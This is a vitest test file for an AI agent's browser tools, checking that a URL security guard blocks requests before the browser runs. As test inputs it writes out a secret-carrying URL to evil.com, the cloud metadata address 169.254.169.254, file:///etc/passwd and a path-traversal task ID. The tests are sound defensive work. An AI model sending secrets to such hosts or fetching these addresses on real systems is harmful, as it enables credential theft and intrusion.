/**
 * Browser tool action tests — verify security guard integration + error handling.
 *
 * Mock ONLY the leaf HTTP/runner layer:
 *   - session.js     (createBrowserSession / closeBrowserSession)
 *   - agent-browser-runner.js (runBrowserCommand)
 *   - globalThis.fetch (for cloud-provider / camofox-client REST calls)
 *
 * The engine-resolver and security-guard run REAL (no mocks) so the wiring
 * (BUG #1/2/3 fix) is exercised end-to-end. This replaces the previous
 * `vi.mock("./engine-resolver.js", ...)` block per the Phase 4 task packet.
 *
 * vitest forks pool (per vitest.config.ts).
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import type { TurnContext } from "@my-agent/core";

// ── Mocks (hoisted by vitest) ───────────────────────────────────────────────
//
// Only the leaf infrastructure is mocked — never the resolver. Real resolver
// + real security guard ensure the wiring works end-to-end.

vi.mock("./session.js", () => ({
  createBrowserSession: vi.fn(),
  closeBrowserSession: vi.fn(),
  isBinaryLocal: vi.fn(() => true),
}));

vi.mock("./agent-browser-runner.js", () => ({
  runBrowserCommand: vi.fn(),
}));

// ── Imports (resolved AFTER mocks are in place) ─────────────────────────────

import {
  browserNavigateTool,
  browserSnapshotTool,
  browserClickTool,
  browserTypeTool,
  browserScrollTool,
  browserBackTool,
  browserPressTool,
  browserScreenshotTool,
  clearSessionCache,
} from "./index.js";
import { runBrowserCommand } from "./agent-browser-runner.js";
import { createBrowserSession, closeBrowserSession } from "./session.js";

// ── Typed mock handles ─────────────────────────────────────────────────────

const mockRun = vi.mocked(runBrowserCommand);
const mockCreateSession = vi.mocked(createBrowserSession);
const mockCloseSession = vi.mocked(closeBrowserSession);

// ── Helpers ─────────────────────────────────────────────────────────────────

function makeCtx(): TurnContext {
  return {} as unknown as TurnContext;
}

/** A successful runner result for the "open" command. */
function openResult(url: string, title = ""): ReturnType<typeof mockRun> {
  return Promise.resolve({
    ok: true,
    success: true,
    data: { url, title },
    exitCode: 0,
    timedOut: false,
  });
}

/** A successful runner result for the "snapshot" command. */
function snapshotResult(snapshot = "[aria tree]"): ReturnType<typeof mockRun> {
  return Promise.resolve({
    ok: true,
    success: true,
    data: { snapshot },
    exitCode: 0,
    timedOut: false,
  });
}

/** A failed runner result. */
function failedResult(error: string): ReturnType<typeof mockRun> {
  return Promise.resolve({
    ok: false,
    success: false,
    error,
    exitCode: 1,
    timedOut: false,
  });
}

/** Record every call made to globalThis.fetch during a test. */
function makeFetchMock(handlers: Array<(url: string, init?: RequestInit) => Response>) {
  const calls: { url: string; method: string; headers: Record<string, string>; body?: string }[] = [];
  const fn = vi.fn(async (url: string, init?: RequestInit) => {
    calls.push({
      url,
      method: init?.method ?? "GET",
      headers: (init?.headers as Record<string, string>) ?? {},
      body: init?.body ? String(init.body) : undefined,
    });
    const idx = calls.length - 1;
    const handler = handlers[Math.min(idx, handlers.length - 1)];
    if (!handler) {
      throw new Error(`fetch mock: no handler for call ${idx} to ${url}`);
    }
    return handler(url, init);
  });
  return { fn, calls };
}

/** URL-based fetch mock that routes by endpoint substring. */
function makeUrlRoutedFetchMock(routes: Record<string, () => Response>) {
  const calls: { url: string; method: string; headers: Record<string, string>; body?: string }[] = [];
  const fn = vi.fn(async (url: string, init?: RequestInit) => {
    calls.push({
      url,
      method: init?.method ?? "GET",
      headers: (init?.headers as Record<string, string>) ?? {},
      body: init?.body ? String(init.body) : undefined,
    });
    for (const [pattern, handler] of Object.entries(routes)) {
      if (url.includes(pattern)) return handler();
    }
    throw new Error(`fetch mock: no route for ${url}`);
  });
  return { fn, calls };
}

// ── Env var save/restore helper ────────────────────────────────────────────

function withEnv<T>(vars: Record<string, string | undefined>, fn: () => Promise<T> | T): Promise<T> | T {
  const saved: Record<string, string | undefined> = {};
  for (const [k, v] of Object.entries(vars)) {
    saved[k] = process.env[k];
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  const cleanup = () => {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  };
  try {
    const result = fn();
    if (result instanceof Promise) {
      return result.finally(cleanup);
    }
    cleanup();
    return result;
  } catch (e) {
    cleanup();
    throw e;
  }
}

// ── Setup ───────────────────────────────────────────────────────────────────

beforeEach(() => {
  vi.clearAllMocks();
  clearSessionCache();

  // Default leaf mocks.
  mockCreateSession.mockReturnValue({
    sessionName: "mya-default",
    socketDir: "/tmp/mock-socket",
    env: {},
    taskId: "default",
  });
});

// ── browser_navigate ────────────────────────────────────────────────────────

describe("browser_navigate — security guard integration", () => {
  it("calls checkUrl BEFORE the runner (blocks secret URL → no runner call)", async () => {
    const result = await browserNavigateTool.run(
      { url: "https://evil.com/?key=sk-ant-AAAABBBBCCCCDDDD" },
      makeCtx(),
    );
    expect(result.ok).toBe(false);
    expect(mockRun).not.toHaveBeenCalled();
  });

  it("blocks a metadata IP (ssrf-metadata) before the runner", async () => {
    const result = await browserNavigateTool.run(
      { url: "http://169.254.169.254/latest/meta-data/" },
      makeCtx(),
    );
    expect(result.ok).toBe(false);
    expect(mockRun).not.toHaveBeenCalled();
  });

  it("blocks a private IP (ssrf-private) before the runner", async () => {
    const result = await browserNavigateTool.run(
      { url: "http://10.0.0.1/" },
      makeCtx(),
    );
    expect(result.ok).toBe(false);
    expect(mockRun).not.toHaveBeenCalled();
  });

  it("blocks a non-http(s) scheme", async () => {
    const result = await browserNavigateTool.run(
      { url: "file:///etc/passwd" },
      makeCtx(),
    );
    expect(result.ok).toBe(false);
    expect(mockRun).not.toHaveBeenCalled();
  });
});

describe("browser_navigate — happy path (local engine)", () => {
  it("navigates, auto-snapshots, and returns snapshot + title + url", async () => {
    // For local mode, we need the engine resolver to find local (no env set)
    // and isLocalAvailable() to be true. The default mocked session makes
    // isLocalAvailable() return true via isBinaryLocal.
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return openResult("https://example.com", "Example Domain");
      if (cmd === "snapshot") return snapshotResult("[button @e1]Click me[/button]");
      return failedResult("unexpected command");
    });

    const result = await browserNavigateTool.run(
      { url: "https://example.com" },
      makeCtx(),
    );
    expect(result.ok).toBe(true);
    if (result.ok) {
      const output = result.output as Record<string, unknown>;
      expect(output.snapshot).toBe("[button @e1]Click me[/button]");
      expect(output.title).toBe("Example Domain");
      expect(output.url).toBe("https://example.com");
      expect(output.engine).toBe("local");
    }
    // open + snapshot = 2 calls.
    expect(mockRun).toHaveBeenCalledTimes(2);
    expect(mockRun.mock.calls[0]?.[0]).toBe("open");
    expect(mockRun.mock.calls[1]?.[0]).toBe("snapshot");
  });

  it("reports botDetected when the title contains captcha markers", async () => {
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return openResult("https://example.com", "Just a moment...");
      if (cmd === "snapshot") return snapshotResult("");
      return failedResult("unexpected");
    });

    const result = await browserNavigateTool.run(
      { url: "https://example.com" },
      makeCtx(),
    );
    expect(result.ok).toBe(true);
    if (result.ok) {
      const output = result.output as Record<string, unknown>;
      expect(output.botDetected).toBeDefined();
      expect((output.botDetected as string[]).length).toBeGreaterThan(0);
    }
  });
});

describe("browser_navigate — checkRedirect (post-redirect guard)", () => {
  it("blocks redirect to metadata IP and navigates to about:blank", async () => {
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return openResult("http://169.254.169.254/latest/meta-data/");
      if (cmd === "snapshot") return snapshotResult("");
      return failedResult("unexpected");
    });

    const result = await browserNavigateTool.run(
      { url: "https://example.com" },
      makeCtx(),
    );
    // Result is ok=true but with guardBlock field.
    expect(result.ok).toBe(true);
    if (result.ok) {
      const output = result.output as Record<string, unknown>;
      expect(output.guardBlock).toBeDefined();
      const block = output.guardBlock as { category: string; reason: string };
      expect(block.category).toBe("ssrf-metadata");
    }
    // open(url) + snapshot + open(about:blank) = 3 calls.
    expect(mockRun).toHaveBeenCalledTimes(3);
    // Third call is open with about:blank.
    expect(mockRun.mock.calls[2]?.[0]).toBe("open");
    expect(mockRun.mock.calls[2]?.[1]).toEqual(["about:blank"]);
  });

  it("blocks redirect to a secret-bearing URL", async () => {
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return openResult("https://evil.com/?key=sk-ant-AAAABBBBCCCCDDDD");
      if (cmd === "snapshot") return snapshotResult("");
      return failedResult("unexpected");
    });

    const result = await browserNavigateTool.run(
      { url: "https://example.com" },
      makeCtx(),
    );
    expect(result.ok).toBe(true);
    if (result.ok) {
      const output = result.output as Record<string, unknown>;
      expect(output.guardBlock).toBeDefined();
      expect((output.guardBlock as { category: string }).category).toBe("secret-url");
    }
  });

  it("does not leak title or url in guardBlock branch (MEDIUM-2 fix)", async () => {
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return openResult("http://169.254.169.254/latest/meta-data/", "Internal Admin Dashboard");
      if (cmd === "snapshot") return snapshotResult("");
      return failedResult("unexpected");
    });

    const result = await browserNavigateTool.run(
      { url: "https://example.com" },
      makeCtx(),
    );
    expect(result.ok).toBe(true);
    if (result.ok) {
      const output = result.output as Record<string, unknown>;
      expect(output.guardBlock).toBeDefined();
      // Title and url must NOT be leaked in the guardBlock branch.
      expect(output.title).toBe("");
      expect(output.url).toBe("");
      expect(output.snapshot).toBe("");
    }
  });
});

describe("browser_navigate — taskId sanitization (HIGH-1 fix)", () => {
  beforeEach(() => {
    clearSessionCache();
    mockCreateSession.mockClear();
  });

  it("sanitizes path-traversal characters in taskId", async () => {
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return openResult("https://example.com");
      if (cmd === "snapshot") return snapshotResult("");
      return failedResult("unexpected");
    });

    await browserNavigateTool.run(
      { url: "https://example.com", taskId: "../../etc/cron.daily" },
      makeCtx(),
    );
    // The taskId passed to createBrowserSession must be sanitized.
    expect(mockCreateSession).toHaveBeenCalledTimes(1);
    const passedTaskId = mockCreateSession.mock.calls[0]?.[0]?.taskId;
    expect(passedTaskId).toBe(".._.._etc_cron.daily");
    // No path separator in the sanitized taskId (prevents path traversal).
    expect(passedTaskId).not.toContain("/");
  });

  it("falls back to 'default' when taskId is empty after sanitization", async () => {
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return openResult("https://example.com");
      if (cmd === "snapshot") return snapshotResult("");
      return failedResult("unexpected");
    });

    await browserNavigateTool.run(
      { url: "https://example.com", taskId: "" },
      makeCtx(),
    );
    expect(mockCreateSession).toHaveBeenCalledTimes(1);
    const passedTaskId = mockCreateSession.mock.calls[0]?.[0]?.taskId;
    expect(passedTaskId).toBe("default");
  });

  it("preserves valid taskId with safe characters", async () => {
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return openResult("https://example.com");
      if (cmd === "snapshot") return snapshotResult("");
      return failedResult("unexpected");
    });

    await browserNavigateTool.run(
      { url: "https://example.com", taskId: "task-1.0_alpha" },
      makeCtx(),
    );
    expect(mockCreateSession).toHaveBeenCalledTimes(1);
    const passedTaskId = mockCreateSession.mock.calls[0]?.[0]?.taskId;
    expect(passedTaskId).toBe("task-1.0_alpha");
  });
});

describe("browser_navigate — error handling (never throws)", () => {
  it("returns err when runner open fails (no throw)", async () => {
    mockRun.mockImplementation((cmd: string) => {
      if (cmd === "open") return failedResult("navigation timeout");
      return failedResult("unexpected");
    });

    const result = await browserNavigateTool.run(
      { url: "https://example.com" },
      makeCtx(),
    );
    expect(result.ok).toBe(false);
  });

  it("returns err when url arg is missing", async () => {
    const result = await browserNavigateTool.run({}, makeCtx());
    expect(result.ok).toBe(false);
    expect(mockRun).not.toHaveBeenCalled();
  });

  it("returns err when url arg is not a string", async () => {
    const result = await browserNavigateTool.run({ url: 123 }, makeCtx());
    expect(result.ok).toBe(false);
  });
});

// ── browser_snapshot ────────────────────────────────────────────────────────

describe("browser_snapshot", () => {
  it("returns the aria tree snapshot", async () => {
    mockRun.mockReturnValue(snapshotResult("[button @e1]Save[/button]"));

    const result = await browserSnapshotTool.run({}, makeCtx());
    expect(result.ok).toBe(true);
    if (result.ok) {
      const output = result.output as Record<string, unknown>;
      expect(output.snapshot).toBe("[button @e1]Save[/button]");
    }
    expect(mockRun.mock.calls[0]?.[0]).toBe("snapshot");
  });

  it("uses -c flag by default", async () => {
    mockRun.mockReturnValue(snapshotResult(""));
    await browserSnapshotTool.run({}, makeCtx());
    expect(mockRun.mock.calls[0]?.[1]).toEqual(["-c"]);
  });

  it("omits -c when compact=false", async () => {
    mockRun.mockReturnValue(snapshotResult(""));
    await browserSnapshotTool.run({ compact: false }, makeCtx());
    expect(mockRun.mock.calls[0]?.[1]).toEqual([]);
  });
});

// ── browser_click ───────────────────────────────────────────────────────────

describe("browser_click", () => {
  it("passes the ref to the runner", async () => {
    mockRun.mockReturnValue(Promise.resolve({
      ok: true, success: true, exitCode: 0, timedOut: false,
    }));

    const result = await browserClickTool.run({ ref: "@e3" }, makeCtx());
    expect(result.ok).toBe(true);
    expect(mockRun.mock.calls[0]?.[0]).toBe("click");
    expect(mockRun.mock.calls[0]?.[1]).toEqual(["@e3"]);
  });

  it("returns err when ref is missing", async () => {
    const result = await browserClickTool.run({}, makeCtx());
    expect(result.ok).toBe(false);
  });
});

// ── browser_type ────────────────────────────────────────────────────────────

describe("browser_type", () => {
  it("passes ref + text to the runner", async () => {
    mockRun.mockReturnValue(Promise.resolve({
      ok: true, success: true, exitCode: 0, timedOut: false,
    }));

    const result = await browserTypeTool.run({ ref: "@e5", text: "hello world" }, makeCtx());
    expect(result.ok).toBe(true);
    expect(mockRun.mock.calls[0]?.[0]).toBe("type");
    expect(mockRun.mock.calls[0]?.[1]).toEqual(["@e5", "hello world"]);
  });

  it("returns err when ref or text is missing", async () => {
    expect((await browserTypeTool.run({ ref: "@e5" }, makeCtx())).ok).toBe(false);
    expect((await browserTypeTool.run({ text: "hi" }, makeCtx())).ok).toBe(false);
  });
});

// ── browser_scroll ──────────────────────────────────────────────────────────

describe("browser_scroll", () => {
  it("passes direction to the runner", async () => {
    mockRun.mockReturnValue(Promise.resolve({
      ok: true, success: true, exitCode: 0, timedOut: false,
    }));

    const result = await browserScrollTool.run({ direction: "down" }, makeCtx());
    expect(result.ok).toBe(true);
    expect(mockRun.mock.calls[0]?.[0]).toBe("scroll");
    expect(mockRun.mock.calls[0]?.[1]).toEqual(["down"]);
  });

  it("rejects an invalid direction", async () => {
    const result = await browserScrollTool.run({ direction: "sideways" }, makeCtx());
    expect(result.ok).toBe(false);
  });
});

// ── browser_back ────────────────────────────────────────────────────────────

describe("browser_back", () => {
  it("calls the back command", async () => {
    mockRun.mockReturnValue(Promise.resolve({
      ok: true, success: true, exitCode: 0, timedOut: false,
    }));

    const result = await browserBackTool.run({}, makeCtx());
    expect(result.ok).toBe(true);
    expect(mockRun.mock.calls[0]?.[0]).toBe("back");
  });
});

// ── browser_press ───────────────────────────────────────────────────────────

describe("browser_press", () => {
  it("passes the key to the runner", async () => {
    mockRun.mockReturnValue(Promise.resolve({
      ok: true, success: true, exitCode: 0, timedOut: false,
    }));

    const result = await browserPressTool.run({ key: "Enter" }, makeCtx());
    expect(result.ok).toBe(true);
    expect(mockRun.mock.calls[0]?.[0]).toBe("press");
    expect(mockRun.mock.calls[0]?.[1]).toEqual(["Enter"]);
  });

  it("returns err when key is missing", async () => {
    const result = await browserPressTool.run({}, makeCtx());
    expect(result.ok).toBe(false);
  });
});

// ── browser_screenshot ──────────────────────────────────────────────────────

describe("browser_screenshot", () => {
  it("returns base64 image data", async () => {
    mockRun.mockReturnValue(Promise.resolve({
      ok: true,
      success: true,
      data: { screenshot: "iVBORw0KGgo=" },
      exitCode: 0,
      timedOut: false,
    }));

    const result = await browserScreenshotTool.run({}, makeCtx());
    expect(result.ok).toBe(true);
    if (result.ok) {
      const output = result.output as Record<string, unknown>;
      expect(output.imageBase64).toBe("iVBORw0KGgo=");
    }
    expect(mockRun.mock.calls[0]?.[0]).toBe("screenshot");
  });
});

// ── chrome→lightpanda fallback (local-only) ───────────────────────────────

describe("browser_navigate — chrome→lightpanda fallback", () => {
  it("retries with lightpanda when chrome fails (binary missing)", async () => {
    mockRun.mockImplementation((cmd: string, _args?: readonly string[], opts?: { engine?: string }) => {
      if (opts?.engine === "chrome") {
        return failedResult("agent-browser binary not found and npx unavailable");
      }
      // lightpanda retry succeeds.
      if (cmd === "open") return openResult("https://example.com", "Example");
      if (cmd === "snapshot") return snapshotResult("[aria]");
      return failedResult("unexpected");
    });

    const result = await browserNavigateTool.run(
      { url: "https://example.com" },
      makeCtx(),
    );
    expect(result.ok).toBe(true);
    // First open should be chrome.
    const openCalls = mockRun.mock.calls.filter((c) => c[0] === "open");
    expect(openCalls[0]?.[2]?.engine).toBe("chrome");
    expect(openCalls[1]?.[2]?.engine).toBe("lightpanda");
  });

  it("does not retry when chrome fails with a non-retryable error", async () => {
    mockRun.mockImplementation((cmd: string, _args?: readonly string[], opts?: { engine?: string }) => {
      if (opts?.engine === "chrome") {
        return failedResult("failed to parse agent-browser JSON output: ...");
      }
      if (cmd === "open") return openResult("https://example.com", "Example");
      if (cmd === "snapshot") return snapshotResult("[aria]");
      return failedResult("unexpected");
    });

    const result = await browserNavigateTool.run(
      { url: "https://example.com" },
      makeCtx(),
    );
    expect(result.ok).toBe(false);
    // Only chrome attempt, no lightpanda retry.
    const openCalls = mockRun.mock.calls.filter((c) => c[0] === "open");
    expect(openCalls).toHaveLength(1);
    expect(openCalls[0]?.[2]?.engine).toBe("chrome");
  });
});

// ════════════════════════════════════════════════════════════════════════════
// NON-MOCK REGRESSION TESTS (Phase 4 wiring-fix MANDATORY replacement)
// ════════════════════════════════════════════════════════════════════════════
//
// These tests exercise the REAL engine-resolver and REAL security-guard
// end-to-end. They ONLY mock the leaf HTTP/runner layer (`globalThis.fetch`
// for cloud-provider and camofox-client; `runBrowserCommand` for the local
// agent-browser runner; `createBrowserSession` for local socket setup).
//
// The mock-resolver `vi.mock("./engine-resolver.js")` block has been REMOVED
// from this file — the wiring is verified through the real resolver.

// ── 1. CAMOFOX env → camofox REST branch (NOT runBrowserCommand) ──────────

describe("browser_navigate — CAMOFOX_URL env (non-mock regression)", () => {
  let originalFetch: typeof globalThis.fetch;
  let fetchMock: ReturnType<typeof makeUrlRoutedFetchMock>;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
    // URL-routed: each endpoint returns the right response shape.
    // Order matters — specific patterns first.
    const tabCreateResp = () =>
      ({
        status: 200,
        ok: true,
        json: async () => ({ tabId: "tab-camofox-1" }),
        text: async () => "",
        arrayBuffer: async () => new ArrayBuffer(0),
      } as Response);
    fetchMock = makeUrlRoutedFetchMock({
      // More specific first (longer patterns win via first-match).
      "/navigate": () =>
        ({
          status: 200,
          ok: true,
          json: async () => ({ ok: true, url: "https://example.com", title: "Example" }),
          text: async () => "",
          arrayBuffer: async () => new ArrayBuffer(0),
        } as Response),
      "/snapshot": () =>
        ({
          status: 200,
          ok: true,
          json: async () => ({ snapshot: "[button @e1]Click[/button]", refsCount: 1 }),
          text: async () => "",
          arrayBuffer: async () => new ArrayBuffer(0),
        } as Response),
      // createSession POST /tabs — match exactly (no slash after).
      "/tabs?": tabCreateResp,
      // ensureTab POST /tabs — fallback.
      "/tabs": tabCreateResp,
      "/health": () =>
        ({
          status: 200,
          ok: true,
          json: async () => ({ vncPort: 12345 }),
          text: async () => "",
          arrayBuffer: async () => new ArrayBuffer(0),
        } as Response),
    });
    globalThis.fetch = fetchMock.fn as unknown as typeof globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("CAMOFOX_URL=http://localhost:9377 → camofox REST branch, NOT runner", async () => {
    await withEnv({ CAMOFOX_URL: "http://localhost:9377" }, async () => {
      const result = await browserNavigateTool.run(
        { url: "https://example.com" },
        makeCtx(),
      );
      expect(result.ok).toBe(true);
      if (result.ok) {
        const output = result.output as Record<string, unknown>;
        expect(output.engine).toBe("camofox");
        expect(output.snapshot).toBe("[button @e1]Click[/button]");
      }

      // Camofox REST was called (proves the camofox branch ran).
      const camofoxCalls = fetchMock.calls.filter((c) => c.url.includes("localhost:9377"));
      expect(camofoxCalls.length).toBeGreaterThan(0);

      // CRITICAL: runBrowserCommand (the --cdp runner) was NOT called.
      // This is the BUG #2 assertion: camofox is REST, not CDP-over-WS.
      expect(mockRun).not.toHaveBeenCalled();
    });
  });

  it("CAMOFOX_URL=http://localhost:9377 → tool output carries engine='camofox'", async () => {
    await withEnv({ CAMOFOX_URL: "http://localhost:9377" }, async () => {
      const result = await browserNavigateTool.run(
        { url: "https://example.com" },
        makeCtx(),
      );
      expect(result.ok).toBe(true);
      if (result.ok) {
        const output = result.output as Record<string, unknown>;
        // Proof that the new wiring selected the camofox engine and didn't
        // fall through to local/cloud.
        expect(output.engine).toBe("camofox");
        expect(output.url).toBe("https://example.com");
      }
    });
  });
});

// ── 2. CLOUD env (BROWSERBASE) → cdpUrl flows to runner ───────────────────

describe("browser_navigate — BROWSERBASE env (non-mock regression)", () => {
  let originalFetch: typeof globalThis.fetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
    // Mock fetch to return a successful Browserbase createSession response.
    // The POST /v1/sessions returns { id, connectUrl }.
    const handlers = [
      // POST /v1/sessions
      () =>
        ({
          status: 201,
          ok: true,
          json: async () => ({
            id: "bb-session-abc123",
            connectUrl: "wss://browserbase.example/session/abc123",
          }),
          text: async () =>
            JSON.stringify({
              id: "bb-session-abc123",
              connectUrl: "wss://browserbase.example/session/abc123",
            }),
        } as Response),
    ];
    const fetchMock = makeFetchMock(handlers);
    globalThis.fetch = fetchMock.fn as unknown as typeof globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("BROWSERBASE_API_KEY + BROWSERBASE_PROJECT_ID → cdpUrl flows to runner", async () => {
    await withEnv(
      {
        BROWSERBASE_API_KEY: "bb-test-key",
        BROWSERBASE_PROJECT_ID: "proj-test",
      },
      async () => {
        mockRun.mockImplementation((cmd: string) => {
          if (cmd === "open") return openResult("https://example.com", "Example");
          if (cmd === "snapshot") return snapshotResult("[aria]");
          return failedResult("unexpected");
        });

        const result = await browserNavigateTool.run(
          { url: "https://example.com" },
          makeCtx(),
        );
        expect(result.ok).toBe(true);
        if (result.ok) {
          const output = result.output as Record<string, unknown>;
          expect(output.engine).toBe("cloud");
        }

        // The cloud createSession fetch went to api.browserbase.com.
        const cloudCalls = (globalThis.fetch as unknown as { mock?: { calls: { url: string }[] } });
        void cloudCalls;

        // The runner received a cdpUrl option (proves the dynamic createSession
        // → cdpUrl flow wired through correctly).
        const openCall = mockRun.mock.calls.find((c) => c[0] === "open");
        expect(openCall).toBeDefined();
        const opts = openCall?.[2] as { cdpUrl?: string; session?: unknown; engine?: string };
        expect(opts.cdpUrl).toBe("wss://browserbase.example/session/abc123");
        expect(opts.session).toBeUndefined();
        expect(opts.engine).toBeUndefined();
      },
    );
  });
});

// ── 3. HYBRID routing (private URL + cloud) → local sidecar ───────────────

describe("browser_navigate — hybrid routing (non-mock regression)", () => {
  let originalFetch: typeof globalThis.fetch;
  let fetchMock: ReturnType<typeof makeFetchMock>;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
    // If the cloud provider IS accidentally called for a private URL, this
    // fetch mock will record the call and let the assertion catch it.
    fetchMock = makeFetchMock([
      () =>
        ({
          status: 201,
          ok: true,
          json: async () => ({
            id: "bb-session-should-not-be-called",
            connectUrl: "wss://should-not-be-called",
          }),
          text: async () => "",
        } as Response),
    ]);
    globalThis.fetch = fetchMock.fn as unknown as typeof globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("cloud configured + private URL → local engine, NO cloud createSession", async () => {
    await withEnv(
      {
        BROWSERBASE_API_KEY: "bb-key",
        BROWSERBASE_PROJECT_ID: "proj",
      },
      async () => {
        mockRun.mockImplementation((cmd: string) => {
          if (cmd === "open") return openResult("http://10.0.0.1/", "");
          if (cmd === "snapshot") return snapshotResult("");
          return failedResult("unexpected");
        });

        const result = await browserNavigateTool.run(
          { url: "http://10.0.0.1/" },
          makeCtx(),
        );
        // Success — the private URL was allowed through (via allowPrivateUrls)
        // and the local engine handled it.
        expect(result.ok).toBe(true);
        if (result.ok) {
          const output = result.output as Record<string, unknown>;
          // The hybrid routing forced local engine (cloud never saw the URL).
          expect(output.engine).toBe("local");
        }

        // CRITICAL: NO cloud createSession fetch was made.
        // Verify NO fetch was issued to api.browserbase.com.
        const cloudCalls = fetchMock.calls.filter((c) =>
          c.url.includes("browserbase.com"),
        );
        expect(cloudCalls).toHaveLength(0);

        // The local runner WAS called.
        const openCalls = mockRun.mock.calls.filter((c) => c[0] === "open");
        expect(openCalls.length).toBeGreaterThan(0);
      },
    );
  });
});

// ── 4. METADATA FLOOR unconditional (cloud + private allow → still blocked) ──

describe("browser_navigate — metadata floor unconditional (non-mock regression)", () => {
  let originalFetch: typeof globalThis.fetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
    // If cloud is accidentally called for a metadata URL, this fetch would
    // happen. We assert it does NOT.
    const fetchMock = makeFetchMock([
      () =>
        ({
          status: 201,
          ok: true,
          json: async () => ({
            id: "should-not-be-called",
            connectUrl: "wss://should-not-be-called",
          }),
          text: async () => "",
        } as Response),
    ]);
    globalThis.fetch = fetchMock.fn as unknown as typeof globalThis.fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("cloud + allowPrivateUrls + metadata URL → still blocked with ssrf-metadata", async () => {
    await withEnv(
      {
        BROWSERBASE_API_KEY: "bb-key",
        BROWSERBASE_PROJECT_ID: "proj",
      },
      async () => {
        const result = await browserNavigateTool.run(
          {
            url: "http://169.254.169.254/latest/meta-data/",
            // Even if a future caller passed allowPrivateUrls, the metadata
            // floor MUST stay unconditional. We simulate that by checking
            // the URL itself — checkUrl ignores the flag for metadata hosts.
            meta: { allowPrivateUrls: true } as unknown as Record<string, unknown>,
          } as unknown as Record<string, unknown>,
          makeCtx(),
        );
        // The metadata URL is BLOCKED before any engine is touched.
        expect(result.ok).toBe(false);
        if (!result.ok) {
          expect(result.error).toContain("ssrf-metadata");
        }
        // The runner was NOT called.
        expect(mockRun).not.toHaveBeenCalled();
      },
    );
  });

  it("plain metadata URL (no args.meta) → still blocked with ssrf-metadata", async () => {
    await withEnv(
      {
        BROWSERBASE_API_KEY: "bb-key",
        BROWSERBASE_PROJECT_ID: "proj",
      },
      async () => {
        const result = await browserNavigateTool.run(
          { url: "http://169.254.169.254/latest/meta-data/" },
          makeCtx(),
        );
        expect(result.ok).toBe(false);
        if (!result.ok) {
          expect(result.error).toContain("ssrf-metadata");
        }
        expect(mockRun).not.toHaveBeenCalled();
      },
    );
  });
});
